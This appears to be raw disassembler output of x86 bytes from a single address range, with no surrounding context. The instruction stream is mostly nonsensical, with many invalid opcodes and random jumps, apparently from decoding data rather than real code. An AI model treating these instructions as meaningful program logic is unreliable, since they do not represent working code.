  41a7c5:	jmp    0x41a7a9
  41a7c7:	or     DWORD PTR [ecx],esi
  41a7c9:	pushf  
  41a7ca:	imul   edi,DWORD PTR [edi],0x6c2b6e16
  41a7d0:	stos   BYTE PTR es:[edi],al
  41a7d1:	repnz (bad) 
  41a7d3:	imul   ebp,DWORD PTR [esi],0x23e0749
  41a7d9:	into   
  41a7da:	mov    esi,0x31a4f5d0
  41a7df:	add    al,BYTE PTR [ecx-0x39]
  41a7e2:	inc    esp
  41a7e3:	fist   WORD PTR [ecx]
  41a7e5:	jge    0x41a7cb
  41a7e7:	dec    esi
  41a7e8:	cs jnp 0x41a7f2
  41a7eb:	test   DWORD PTR [esi],0x5a
	...
  41a855:	add    bl,dh
  41a857:	xchg   edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0x605327ca,al
  41a863:	push   ebp
  41a864:	jno    0x41a834
  41a866:	addr16 sbb eax,0x1000001
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	jl     0x41a835
  41a870:	and    DWORD PTR [ebp+ebx*8+0xe4c332],0xffffffd8
  41a878:	pushf  
  41a879:	mul    DWORD PTR [ecx+0x4907a4c5]
  41a87f:	sub    edi,DWORD PTR [edx+esi*4+0x5031d2a]
  41a886:	mov    ebx,0xc03f8c08
  41a88b:	push   es
  41a88c:	aas    
  41a88d:	addr16 aad 0xa1
  41a890:	jle    0x41a83d
  41a892:	test   BYTE PTR [edi-0x2],dl
  41a895:	pop    ecx
  41a896:	push   ebp
  41a897:	mov    ds:0xc93b4a35,eax
  41a89c:	pop    esi
  41a89d:	enter  0x82a1,0xd4
  41a8a1:	push   sp
  41a8a3:	cdq    
  41a8a4:	out    0x0,al
  41a8a6:	push   ss
  41a8a7:	(bad)  
  41a8a8:	sub    al,0x7d
  41a8aa:	into   
  41a8ab:	push   ebp
  41a8ac:	ret    
  41a8ad:	add    DWORD PTR [ebx-0x68],ecx
  41a8b0:	sub    eax,0xdb859e25
  41a8b5:	arpl   WORD PTR [edx-0x62],ax
  41a8b8:	dec    esi
  41a8b9:	out    dx,eax
  41a8ba:	push   ecx
  41a8bb:	scas   eax,DWORD PTR es:[edi]
  41a8bc:	add    al,0x9f
  41a8be:	mov    edi,0xe921696e
  41a8c3:	sbb    eax,0x4ad80ece
  41a8c8:	shr    DWORD PTR [eax+0x61],1
  41a8cb:	dec    ebp
  41a8cc:	dec    esi
  41a8cd:	call   0x66cc2c7f
  41a8d2:	(bad)  
  41a8d3:	iret   
  41a8d4:	or     edx,DWORD PTR [edi]
  41a8d6:	push   cs
  41a8d7:	mov    eax,ds:0x96fbc4c7
  41a8dc:	push   0x848e55d3
  41a8e1:	ror    DWORD PTR [esi],1
  41a8e3:	inc    ebx
  41a8e4:	pop    ebp
  41a8e5:	add    al,0xe6
  41a8e7:	enter  0x5386,0x9f
  41a8eb:	adc    al,0xd6
  41a8ed:	push   0xc77ba403
  41a8f2:	jl     0x41a8b3
  41a8f4:	push   eax
  41a8f5:	enter  0x47de,0x91
  41a8f9:	stc    
  41a8fa:	sahf   
  41a8fb:	sahf   
  41a8fc:	sbb    DWORD PTR [ebp+0x4d],esi
  41a8ff:	lea    edx,[edi*1-0x39ad6b91]
  41a906:	iret   
  41a907:	imul   edi,DWORD PTR [edx-0x33ebebd1],0x4c
  41a90e:	mov    dl,0xb5
  41a910:	cmp    DWORD PTR [esi+0x5f495eb],edi
  41a916:	push   cs
  41a917:	fmul   DWORD PTR [eax-0x721a5790]
  41a91d:	xor    edx,eax
  41a91f:	mov    ch,0x1b
  41a921:	lahf   
  41a922:	ja     0x41a995
  41a924:	cmc    
  41a925:	pop    ebp
  41a926:	popf   
  41a927:	imul   edx,DWORD PTR [edx-0x25],0xa500d945
  41a92e:	mov    ch,0xa6
  41a930:	pop    ecx
  41a931:	xchg   BYTE PTR [edi+edx*8],bl
  41a934:	outs   dx,DWORD PTR ds:[esi]
  41a935:	lods   eax,DWORD PTR ds:[esi]
  41a936:	(bad)  
  41a937:	out    dx,eax
  41a938:	gs std 
  41a93a:	fs inc eax
  41a93c:	in     al,0xfe
  41a93e:	sub    DWORD PTR [esi-0x37347ecc],0xffffffbb
  41a945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a946:	add    ebp,DWORD PTR [ebp-0x49495ced]
  41a94c:	and    esi,ebx
  41a94e:	xchg   edx,eax
  41a94f:	or     edi,ebp
  41a951:	jecxz  0x41a9b3
  41a953:	jmp    0x41a95a
  41a955:	pushf  
  41a956:	jp     0x41a973
  41a958:	jmp    0x41a9b8
  41a95a:	jmp    0xedb8:0x6973c3af
  41a961:	pop    esi
  41a962:	mov    ds:0x7a54c124,eax
  41a967:	test   al,0x39
  41a969:	test   DWORD PTR [edx],eax
  41a96b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a96c:	(bad)  
  41a96d:	bound  eax,QWORD PTR [eax]
	...
  41a9d3:	add    BYTE PTR [eax],al
  41a9d5:	add    BYTE PTR ds:0xcf4a867e,dh
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	outs   dx,DWORD PTR ds:[esi]
  41a9e3:	fldenv [ebx]
  41a9e5:	pusha  
  41a9e6:	addr16 push ds
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	data16 cmp ch,BYTE PTR [eax-0x4d]
  41a9f2:	jecxz  0x41a976
  41a9f4:	xchg   DWORD PTR [edx-0x3ef7ad41],ebp
  41a9fa:	repnz push 0x39
  41a9fd:	push   ds
  41a9fe:	lods   eax,DWORD PTR ds:[esi]
  41a9ff:	jo     0x41aa27
  41aa01:	mov    ecx,0xf45a79c4
  41aa06:	pop    esi
  41aa07:	adc    cl,al
  41aa09:	push   ebx
  41aa0a:	in     al,0xcc
  41aa0c:	fadd   DWORD PTR [edx+esi*1-0x65]
  41aa10:	fcomip st,st(7)
  41aa12:	push   edi
  41aa13:	push   esi
  41aa14:	mov    dl,BYTE PTR [ebx+ebx*2-0x5fe9b165]
  41aa1b:	fild   WORD PTR [edx+0x3a]
  41aa1e:	(bad)  
  41aa1f:	fidivr DWORD PTR [eax+0x7d]
  41aa22:	mov    ?,edi
  41aa24:	cmp    ecx,DWORD PTR [edx+0x75989336]
  41aa2a:	test   DWORD PTR [ecx+eax*4-0x1c16f63c],0xd1b48d89
  41aa35:	std    
  41aa36:	sbb    al,0x76
  41aa38:	mov    esp,0x4f075958
  41aa3d:	clc    
  41aa3e:	shl    BYTE PTR [ebp-0x622a127d],0xef
  41aa45:	dec    esp
  41aa46:	ins    BYTE PTR es:[edi],dx
  41aa47:	or     ebx,DWORD PTR [edi-0x721a7e86]
  41aa4d:	mov    al,0x2
  41aa4f:	daa    
  41aa50:	pop    edx
  41aa51:	jle    0x41a9e1
  41aa53:	in     al,dx
  41aa54:	mov    edi,esi
  41aa56:	rcl    BYTE PTR [edx],1
  41aa58:	mov    cl,0x14
  41aa5a:	mov    ds:0xede98c96,al
  41aa5f:	push   edx
  41aa60:	jmp    0x4fdd87e
  41aa65:	neg    DWORD PTR [edi-0x7b]
  41aa68:	pop    ecx
  41aa69:	(bad)  
  41aa6a:	ficomp WORD PTR [ebx+0x33]
  41aa6d:	pop    es
  41aa6e:	lea    esi,[edi-0x68ab78b6]
  41aa74:	outs   dx,DWORD PTR ds:[esi]
  41aa75:	fistp  QWORD PTR [edx+0x15]
  41aa78:	das    
  41aa79:	fsub   QWORD PTR [edi]
  41aa7b:	or     esp,eax
  41aa7d:	scas   al,BYTE PTR es:[edi]
  41aa7e:	push   ds
  41aa7f:	mov    eax,0xe31b55e1
  41aa84:	test   DWORD PTR [ebx-0x36],esp
  41aa87:	sub    al,0x55
  41aa89:	gs pop ecx
  41aa8b:	xor    bh,BYTE PTR [eax+eax*4+0x14]
  41aa8f:	mov    ebx,0xe073151
  41aa94:	lods   al,BYTE PTR ds:[esi]
  41aa95:	mov    bl,0xbe
  41aa97:	das    
  41aa98:	fcmovu st,st(7)
  41aa9a:	inc    esi
  41aa9b:	and    al,0xa7
  41aa9d:	popf   
  41aa9e:	inc    ecx
  41aa9f:	je     0x41aafb
  41aaa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaa2:	push   esi
  41aaa3:	jmp    0xef1882ff
  41aaa8:	or     ebp,esi
  41aaaa:	ficom  DWORD PTR [ebp+0x7c]
  41aaad:	cmp    eax,edx
  41aaaf:	ss stc 
  41aab1:	or     esi,DWORD PTR [ebp+0x68]
  41aab4:	jg     0x41ab1b
  41aab6:	ins    BYTE PTR es:[edi],dx
  41aab7:	daa    
  41aab8:	xchg   bl,ah
  41aaba:	pop    ds
  41aabb:	and    BYTE PTR [esi-0x2b1e40c0],bh
  41aac1:	jmp    0xd5ecb791
  41aac6:	je     0x41aa96
  41aac8:	cmp    eax,0x650b9de6
  41aacd:	xor    ch,bl
  41aacf:	mov    ecx,0x5dfbb48f
  41aad4:	or     al,0x60
  41aad6:	mov    DWORD PTR [esi-0x3bdd09d3],ebx
  41aadc:	cli    
  41aadd:	xor    ah,BYTE PTR [eax+0x30]
  41aae0:	adc    DWORD PTR [ecx-0x1c22ef3],esi
  41aae6:	dec    esp
  41aae7:	shl    DWORD PTR [eax-0x9],cl
  41aaea:	xchg   BYTE PTR [esi-0x61],dh
  41aaed:	iret   
	...
  41ab56:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	mov    ebp,0x67f29350
  41ab67:	pop    ds
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	add    BYTE PTR [ecx],al
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	push   ebx
  41ab6f:	das    
  41ab70:	push   0x18d943a6
  41ab75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab76:	xor    eax,0x4b2ccd91
  41ab7b:	dec    ebx
  41ab7c:	add    dl,BYTE PTR ds:0x9e4fce06
  41ab82:	fsubr  DWORD PTR [bp+si+0xa]
  41ab86:	jbe    0x41ab26
  41ab88:	inc    eax
  41ab89:	fisttp WORD PTR [ecx-0x192d21f5]
  41ab8f:	stos   BYTE PTR es:[edi],al
  41ab90:	xor    DWORD PTR [ebx+0xdb3353],ebx
  41ab96:	xor    al,0x22
  41ab98:	mov    ah,BYTE PTR [eax]
  41ab9a:	inc    edi
  41ab9b:	mov    esi,0xa150930c
  41aba0:	popf   
  41aba1:	shr    DWORD PTR [esi+0x4f],0xc4
  41aba5:	dec    eax
  41aba6:	xor    ch,bh
  41aba8:	xor    DWORD PTR [edi-0x1a462a76],0xba2837bf
  41abb2:	pushf  
  41abb3:	daa    
  41abb4:	(bad)  
  41abb5:	in     al,dx
  41abb6:	imul   ebx,edi,0xfffffff6
  41abb9:	xchg   esi,eax
  41abba:	push   esi
  41abbb:	xlat   BYTE PTR ds:[ebx]
  41abbc:	out    0x56,ax
  41abbf:	mov    bh,BYTE PTR [esi+0x5aee5c15]
  41abc5:	push   esi
  41abc6:	shl    DWORD PTR [edi],0x9e
  41abc9:	add    DWORD PTR [eax+esi*4-0x3ffcb58d],0x6d44d72
  41abd4:	sub    eax,0x5b4e1be6
  41abd9:	loop   0x41abec
  41abdb:	xor    edi,DWORD PTR [ebp+0x2b]
  41abde:	dec    eax
  41abdf:	cmp    al,0xd7
  41abe2:	fdivr  QWORD PTR [esi-0x50491307]
  41abe8:	push   edx
  41abe9:	jge    0x41ac57
  41abeb:	sbb    al,0x1f
  41abed:	test   DWORD PTR [edx],edi
  41abef:	or     eax,0xdaf9e600
  41abf4:	popf   
  41abf5:	or     BYTE PTR [ebp+eax*4+0x3cfba4f5],al
  41abfc:	xchg   ebx,eax
  41abfd:	mov    ebx,0xa3426fac
  41ac02:	mov    edi,ecx
  41ac04:	adc    edi,esi
  41ac06:	jo     0x41ac1c
  41ac08:	adc    al,0x29
  41ac0a:	adc    al,0x13
  41ac0c:	sub    al,0x2e
  41ac0e:	shr    BYTE PTR [eax],1
  41ac10:	popf   
  41ac11:	push   ebp
  41ac12:	adc    dl,al
  41ac14:	xor    dh,BYTE PTR [esi]
  41ac16:	cmp    esi,ebx
  41ac18:	mov    edi,0xdff2852
  41ac1d:	jecxz  0x41abe4
  41ac1f:	data16 mov dl,0xd
  41ac22:	add    dl,al
  41ac24:	pop    esi
  41ac25:	je     0x41ac75
  41ac27:	sahf   
  41ac28:	jbe    0x41ac81
  41ac2a:	xchg   ebp,eax
  41ac2b:	(bad)  
  41ac2c:	mov    ds:0xe008088f,al
  41ac31:	inc    ebx
  41ac32:	pop    ss
  41ac33:	mov    esp,0xcf105e47
  41ac38:	pop    ecx
  41ac39:	and    DWORD PTR [edi],edx
  41ac3b:	test   DWORD PTR [ebx-0x24],ebp
  41ac3e:	xchg   ebx,eax
  41ac3f:	ss xor eax,0x11f69b71
  41ac45:	mov    ecx,edi
  41ac47:	sbb    al,0x88
  41ac49:	xchg   esp,eax
  41ac4a:	(bad)  
  41ac4b:	push   ebp
  41ac4c:	adc    DWORD PTR [eax],ecx
  41ac4e:	arpl   si,si
  41ac50:	loope  0x41ac0e
  41ac52:	imul   eax,DWORD PTR [edx-0x1bad595],0xffffff95
  41ac59:	loope  0x41abeb
  41ac5b:	pop    es
  41ac5c:	sub    al,0xa8
  41ac5e:	mov    ebx,0x4e2a0eb8
  41ac63:	push   ecx
  41ac64:	das    
  41ac65:	jp     0x41acc4
  41ac67:	loopne 0x41ac09
  41ac69:	push   ds
  41ac6a:	aaa    
  41ac6b:	test   al,0xa0
  41ac6d:	sahf   
	...
  41acd6:	push   0x49
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [esp+eax*4+0x4f]
  41ace4:	outs   dx,DWORD PTR ds:[esi]
  41ace5:	and    BYTE PTR [edi+0x20],0x1
  41ace9:	add    BYTE PTR [eax],al
  41aceb:	add    DWORD PTR [eax],eax
  41aced:	add    BYTE PTR [ebp-0x12dcc71a],ah
  41acf3:	aam    0x78
  41acf5:	in     eax,dx
  41acf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acf7:	sub    DWORD PTR [edx-0x79b372b7],0xa2316057
  41ad01:	imul   ecx,DWORD PTR [ecx],0xffffffc5
  41ad04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad05:	loop   0x41acbe
  41ad07:	mov    ds:0xf49a9070,eax
  41ad0c:	je     0x41acd9
  41ad0e:	mov    WORD PTR [ebx+0x5df44c24],?
  41ad14:	or     BYTE PTR [edx],bh
  41ad16:	jp     0x41ad71
  41ad18:	in     al,0x88
  41ad1a:	cmp    eax,0x7327ec22
  41ad1f:	ror    DWORD PTR [ecx+edx*2+0xd],0x7d
  41ad24:	or     DWORD PTR [ebx-0x5a],eax
  41ad27:	xor    BYTE PTR ds:0x3ca628e8,cl
  41ad2d:	jb     0x41ad3b
  41ad2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad30:	cli    
  41ad31:	mov    eax,ds:0x8886d01b
  41ad36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad37:	pusha  
  41ad38:	lods   al,BYTE PTR ds:[esi]
  41ad39:	mov    edi,0x90bd0859
  41ad3e:	mov    ds:0x5629f5c4,al
  41ad43:	les    ecx,FWORD PTR [edi-0x341d6d41]
  41ad49:	call   0x77983ff7
  41ad4e:	sbb    ebx,edx
  41ad50:	sub    esp,ebp
  41ad52:	aad    0x32
  41ad54:	push   ds
  41ad55:	pop    ds
  41ad56:	inc    ecx
  41ad57:	xor    al,0x8
  41ad59:	pop    eax
  41ad5a:	out    0xe9,al
  41ad5c:	mov    cl,0x1d
  41ad5e:	inc    eax
  41ad5f:	adc    BYTE PTR [ebp+0x65],dl
  41ad62:	xchg   edx,eax
  41ad63:	push   ecx
  41ad64:	mov    eax,ds:0x46b4ee8b
  41ad69:	mov    eax,0x27c72886
  41ad6e:	pop    ss
  41ad6f:	lahf   
  41ad70:	in     eax,0xe7
  41ad72:	test   eax,0xda4cb955
  41ad77:	dec    edi
  41ad78:	fisttp QWORD PTR [edi+0x4e3c3fed]
  41ad7e:	mov    ebx,0xff802e4a
  41ad83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad84:	lods   eax,DWORD PTR ds:[esi]
  41ad85:	jnp    0x41ad33
  41ad87:	out    0xe5,eax
  41ad89:	xor    DWORD PTR [ebp+edx*2+0x59],eax
  41ad8d:	jo     0x41ad36
  41ad8f:	shl    ecx,0x91
  41ad92:	das    
  41ad93:	pop    esp
  41ad94:	mul    BYTE PTR [ebx+0x3b]
  41ad97:	add    BYTE PTR ds:0x38e60f06,0x48
  41ad9e:	lods   al,BYTE PTR ds:[esi]
  41ad9f:	xor    DWORD PTR [ebx],0x56
  41ada2:	push   ebp
  41ada3:	(bad)  
  41ada5:	adc    eax,0xf23a5caf
  41adaa:	sbb    al,0x25
  41adac:	xchg   BYTE PTR [ecx+0x672ab3b0],al
  41adb2:	cmc    
  41adb3:	mov    ebx,0x861523e8
  41adb8:	sub    al,0xa5
  41adba:	add    BYTE PTR ds:[ebp-0x7f4bc080],bh
  41adc1:	aas    
  41adc2:	mov    bl,0x24
  41adc4:	sub    BYTE PTR [ebx-0x7e],0xfb
  41adc8:	add    ch,cl
  41adca:	mov    ebp,0x39ca0a46
  41adcf:	cmp    eax,0x28d08d5c
  41add4:	int3   
  41add5:	(bad)  
  41add6:	sbb    edi,DWORD PTR [esi]
  41add8:	outs   dx,BYTE PTR ds:[esi]
  41add9:	xchg   edi,eax
  41adda:	(bad)  
  41addb:	lahf   
  41addc:	and    eax,0xd6ef4188
  41ade1:	test   DWORD PTR [ecx-0x7ba58155],esi
  41ade7:	outs   dx,DWORD PTR ds:[esi]
  41ade8:	cmp    BYTE PTR [eax-0x90e58b2],0x0
	...
  41ae53:	add    BYTE PTR [eax],al
  41ae55:	add    BYTE PTR [ebp-0x8],dl
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [edx+ecx*4+0x6767fd64],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    bl,dl
  41ae6f:	aad    0xa
  41ae71:	pop    edi
  41ae72:	pop    eax
  41ae73:	mov    cl,0xe9
  41ae75:	lea    eax,[eax]
  41ae77:	jg     0x41aee4
  41ae79:	fbld   TBYTE PTR [ebx+eiz*4-0x7de555bd]
  41ae80:	or     BYTE PTR [ebx+0x35ee948b],cl
  41ae86:	test   eax,0x1b882c65
  41ae8b:	and    dh,BYTE PTR [ecx]
  41ae8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae8e:	xchg   BYTE PTR [edx+0x729f874c],al
  41ae94:	or     eax,0xccdebdd0
  41ae99:	es call 0x45c:0xdd0676ce
  41aea1:	xchg   esp,eax
  41aea2:	inc    eax
  41aea3:	inc    esp
  41aea4:	pop    ecx
  41aea5:	das    
  41aea6:	mov    ds:0xfc9082dd,al
  41aeab:	repnz call 0x6480:0xa660ebf4
  41aeb3:	inc    esp
  41aeb4:	sbb    ebx,DWORD PTR [edx-0x27]
  41aeb7:	js     0x41ae41
  41aeb9:	adc    ecx,ebx
  41aebb:	or     al,0x74
  41aebd:	fistp  WORD PTR [eax]
  41aebf:	and    BYTE PTR [eax+0x68daa48b],ah
  41aec5:	std    
  41aec6:	add    al,BYTE PTR [ecx-0x7a06bb15]
  41aecc:	sar    DWORD PTR [edx-0x57],cl
  41aecf:	ss data16 ss aas 
  41aed3:	test   BYTE PTR [edi],0x9c
  41aed6:	pusha  
  41aed7:	mov    eax,ds:0x135f64e
  41aedc:	adc    dl,al
  41aede:	adc    DWORD PTR [eax+0x395e28a0],esi
  41aee4:	test   DWORD PTR [ecx+esi*8],esp
  41aee7:	in     al,0x52
  41aee9:	jnp    0x41af5e
  41aeeb:	hlt    
  41aeec:	shr    DWORD PTR [edx+eiz*2+0x39],1
  41aef0:	data16 cmp cl,BYTE PTR [esi-0x3c]
  41aef4:	mov    BYTE PTR [eax],bh
  41aef6:	add    al,0xe7
  41aef8:	sub    BYTE PTR [ebp+eax*2-0x410e56a2],0xbc
  41af00:	jo     0x41af51
  41af02:	cmp    esi,DWORD PTR ds:0xd1297a80
  41af08:	fstp   DWORD PTR [ebx+ebx*1-0x49]
  41af0c:	fistp  WORD PTR [edi-0x59]
  41af0f:	push   edi
  41af10:	xchg   ah,ah
  41af12:	lahf   
  41af13:	bound  ecx,QWORD PTR [esp+eiz*4]
  41af16:	cmp    al,0x84
  41af18:	pop    edx
  41af19:	int3   
  41af1a:	loop   0x41aedb
  41af1c:	shr    edx,0xbd
  41af1f:	and    BYTE PTR [edi+0x173136ed],0x22
  41af26:	rcl    BYTE PTR [ebp+0x4036750c],0x86
  41af2d:	test   DWORD PTR [edx],edi
  41af2f:	mov    ch,dh
  41af31:	(bad)  
  41af32:	add    dl,BYTE PTR [ecx+ecx*2+0x393c76d0]
  41af39:	sub    dl,cl
  41af3b:	xchg   esi,eax
  41af3c:	cmp    esp,DWORD PTR ds:0x9967deea
  41af42:	imul   eax,edi,0x7642a601
  41af48:	lahf   
  41af49:	sbb    al,0xc6
  41af4b:	push   ebx
  41af4c:	rol    ch,0x6d
  41af4f:	test   DWORD PTR [ebx],ebx
  41af51:	loop   0x41aed6
  41af53:	inc    ebx
  41af54:	dec    DWORD PTR [ebx-0x77ce956b]
  41af5a:	add    BYTE PTR [edx],bh
  41af5c:	imul   ebx,DWORD PTR [edi-0x25830b4b],0x58
  41af63:	cmp    eax,0xf4ece5b6
  41af68:	pop    esi
  41af69:	fld    QWORD PTR [esi-0x67]
  41af6c:	mov    edi,0x80
	...
  41afd5:	add    ch,al
  41afd7:	stc    
  41afd8:	lods   eax,DWORD PTR ds:[esi]
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0xd6b344ee
  41afe4:	popa   
  41afe5:	repz and al,BYTE PTR [bx+di]
  41afe9:	add    BYTE PTR [eax],al
  41afeb:	add    DWORD PTR [eax],eax
  41afed:	add    BYTE PTR [eax+0x67e6c166],al
  41aff3:	sbb    ecx,DWORD PTR [ecx+0x3e1e78be]
  41aff9:	add    al,0x28
  41affb:	(bad)  
  41affc:	sbb    al,BYTE PTR [esi+0xb]
  41afff:	fcomp  DWORD PTR [eax+0xe]
  41b002:	push   ebx
  41b003:	aas    
  41b004:	cli    
  41b005:	icebp  
  41b006:	mov    eax,ds:0x5bd5be69
  41b00b:	mov    al,ds:0x2fa39d3a
  41b010:	nop
  41b011:	clc    
  41b012:	push   ebx
  41b013:	(bad)  
  41b014:	mov    edi,0x63777ce5
  41b019:	lds    ebp,FWORD PTR ds:0xd36ebdc3
  41b01f:	cld    
  41b020:	mov    DWORD PTR [esi-0x38],edx
  41b023:	retf   
  41b024:	retf   
  41b025:	sbb    al,0x51
  41b027:	add    bh,cl
  41b029:	rcl    bh,0x92
  41b02c:	pop    ebx
  41b02d:	adc    al,0x9b
  41b02f:	push   ebp
  41b030:	push   0xf0eb95d8
  41b035:	xchg   ah,ch
  41b037:	test   DWORD PTR [di-0x22],esp
  41b03b:	test   eax,0xe568aad8
  41b040:	push   edx
  41b041:	dec    eax
  41b042:	inc    eax
  41b043:	icebp  
  41b044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b045:	ins    BYTE PTR es:[edi],dx
  41b046:	cld    
  41b047:	mov    edx,0xeef3bde5
  41b04c:	push   eax
  41b04d:	adc    DWORD PTR [esi+0x4148891f],ebx
  41b053:	retf   
  41b054:	push   ds
  41b055:	sti    
  41b056:	jno    0x41b073
  41b058:	outs   dx,BYTE PTR ds:[esi]
  41b059:	adc    BYTE PTR [esi],0x80
  41b05c:	pop    ebp
  41b05d:	ins    DWORD PTR es:[edi],dx
  41b05e:	adc    bh,BYTE PTR [ebx]
  41b060:	add    ebp,esi
  41b062:	mov    ebx,0x2d9e97ff
  41b067:	daa    
  41b068:	ds loop 0x41b058
  41b06b:	and    al,BYTE PTR [ebx+0x15d954e6]
  41b071:	loopne 0x41b043
  41b073:	mov    eax,0x192492c6
  41b078:	xor    eax,0x331b07c5
  41b07d:	cld    
  41b07e:	call   0xb5efc48b
  41b083:	test   BYTE PTR ds:0xd9a6f0f9,bl
  41b089:	ja     0x41b0af
  41b08b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b08c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b08d:	push   edi
  41b08e:	sub    DWORD PTR [ecx+0x7c365255],0x57baab0a
  41b098:	xor    eax,0x66f665cf
  41b09d:	shl    DWORD PTR [esi-0x1],cl
  41b0a0:	dec    ebp
  41b0a1:	inc    ecx
  41b0a2:	out    0x3,al
  41b0a4:	test   DWORD PTR [ebx-0x1cff9892],ebp
  41b0aa:	adc    ecx,0xffffff8a
  41b0ad:	gs jmp 0x6ec7:0xc2f12201
  41b0b5:	push   eax
  41b0b6:	push   ebx
  41b0b7:	pop    ebx
  41b0b8:	leave  
  41b0b9:	jne    0x41b0d4
  41b0bb:	inc    edi
  41b0bc:	in     al,dx
  41b0bd:	or     eax,0xaea91532
  41b0c2:	lods   eax,DWORD PTR ds:[esi]
  41b0c3:	mov    eax,0x984d188
  41b0c8:	(bad)  
  41b0c9:	push   ds
  41b0ca:	fidiv  WORD PTR [ebx+eiz*8]
  41b0cd:	push   edi
  41b0ce:	out    dx,eax
  41b0cf:	mov    WORD PTR [edx],gs
  41b0d1:	jbe    0x41b103
  41b0d3:	ins    DWORD PTR es:[edi],dx
  41b0d4:	inc    ebx
  41b0d5:	iret   
  41b0d6:	inc    edi
  41b0d7:	lock jmp 0x41b0b4
  41b0da:	pop    ebp
  41b0db:	in     al,dx
  41b0dc:	add    ah,BYTE PTR [ebx-0x45]
  41b0df:	cwde   
  41b0e0:	outs   dx,DWORD PTR ds:[esi]
  41b0e1:	rol    esi,0x63
  41b0e4:	sar    ebp,cl
  41b0e6:	sahf   
  41b0e7:	test   eax,edx
  41b0e9:	mov    dh,0xeb
  41b0eb:	test   DWORD PTR [ebx],edx
  41b0ed:	sub    al,0x0
	...
  41b153:	add    BYTE PTR [eax],al
  41b155:	add    dh,al
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x5462d82b
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    BYTE PTR [edx+ecx*4+0x38c97977],ah
  41b174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b175:	xchg   ebx,esi
  41b177:	sar    BYTE PTR [ecx+0x78d89cc0],cl
  41b17d:	push   ecx
  41b17e:	int    0x7b
  41b180:	dec    esp
  41b181:	enter  0xaaac,0x94
  41b185:	sbb    al,0x76
  41b187:	jle    0x41b19d
  41b189:	ss sbb eax,0xb98a4076
  41b18f:	nop
  41b190:	push   cs
  41b191:	retf   0x7263
  41b194:	fadd   QWORD PTR [edx+0x42]
  41b197:	icebp  
  41b198:	push   edi
  41b199:	jl     0x41b155
  41b19b:	add    eax,0xeb1aa789
  41b1a0:	jl     0x41b1fb
  41b1a2:	in     eax,dx
  41b1a3:	jo     0x41b1e0
  41b1a5:	pop    edx
  41b1a6:	call   0x88418148
  41b1ab:	inc    esp
  41b1ac:	je     0x41b1dd
  41b1ae:	lock push 0xe7a4491c
  41b1b4:	nop
  41b1b5:	mov    esi,0x99b69100
  41b1ba:	ds lock ror ebx,1
  41b1be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1bf:	adc    BYTE PTR [edi],ch
  41b1c1:	add    ebx,DWORD PTR [edi]
  41b1c3:	sbb    esp,DWORD PTR [edi]
  41b1c5:	(bad)  
  41b1c8:	mov    esp,0x1594056d
  41b1cd:	sub    eax,0x6e128af2
  41b1d2:	jne    0x41b1db
  41b1d4:	jbe    0x41b1db
  41b1d6:	and    ecx,DWORD PTR [ebx+0x54e2dbbe]
  41b1dc:	pop    ds
  41b1dd:	mov    edi,0xff433281
  41b1e2:	mov    dh,0xaf
  41b1e4:	lods   al,BYTE PTR ds:[esi]
  41b1e5:	mov    al,ds:0xe729975d
  41b1ea:	pop    ss
  41b1eb:	cli    
  41b1ec:	and    BYTE PTR [esi+edi*1],al
  41b1ef:	fcomp  QWORD PTR [edx+0x2ad14021]
  41b1f5:	inc    ebp
  41b1f6:	cmp    DWORD PTR [eax+0x3d],edi
  41b1f9:	pop    esp
  41b1fa:	mov    WORD PTR [eax-0x7],gs
  41b1fd:	cs add dl,ah
  41b200:	adc    cl,dh
  41b202:	xchg   BYTE PTR [edi+0x862b854],al
  41b208:	out    dx,eax
  41b209:	inc    ebp
  41b20a:	sub    DWORD PTR [ecx+0x45b755c7],esp
  41b210:	push   esi
  41b211:	xor    esi,DWORD PTR [ebx]
  41b213:	aad    0x2
  41b215:	dec    esp
  41b216:	btc    DWORD PTR [ecx],ebx
  41b219:	inc    ecx
  41b21a:	dec    eax
